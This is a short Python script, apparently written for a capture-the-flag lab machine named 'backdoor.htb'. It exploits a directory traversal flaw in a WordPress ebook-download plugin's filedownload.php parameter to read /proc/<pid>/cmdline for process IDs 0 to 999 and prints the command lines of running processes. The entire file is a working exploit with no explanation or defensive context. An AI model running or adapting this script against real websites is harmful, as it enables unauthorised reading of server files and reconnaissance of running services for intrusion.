import requests,re

for x in range(0,1000):
	url="http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/"+str(x)+"/cmdline"
	r=requests.get(url)
	len_of_res=len(r.content)
	
	if (len_of_res > 82):
		print("URL : " + r.url)
		print(len_of_res)
		print("Length : " + str(len_of_res) + "\n")
		content = r.content
		print( re.split("/cmdline/",str(content)) )
		print("----------------------------------")



